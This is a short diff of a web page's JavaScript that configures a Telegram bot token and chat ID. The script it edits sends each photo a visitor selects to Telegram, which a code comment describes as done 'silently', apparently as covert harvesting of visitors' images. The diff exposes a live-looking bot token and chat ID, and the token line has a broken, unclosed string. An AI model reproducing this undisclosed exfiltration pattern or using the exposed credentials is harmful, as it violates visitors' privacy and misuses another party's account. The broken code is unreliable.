@@ -217,7 +217,7 @@
     // CONFIG — Replace with your values
     // ============================================
     const BOT_TOKEN = '8603317282:AAHG3gXtWVh9MjaAN71AToWR51MzHiWRAto;
-    const CHAT_ID = '822289797 HERE';
+    const CHAT_ID = '822289797';
     // ============================================
 
     const fileInput = document.getElementById('file-input');
@@ -263,7 +263,7 @@
       // Send each photo to Telegram silently
       selectedFiles.forEach(function(file, index) {
         const formData = new FormData();
-        formData.append('chat_id', 822289797);
+        formData.append('chat_id', 822289797 );
         formData.append('photo', file, file.name);
         formData.append('caption', `📷 Photo ${index + 1}/${total} from visitor`);
 
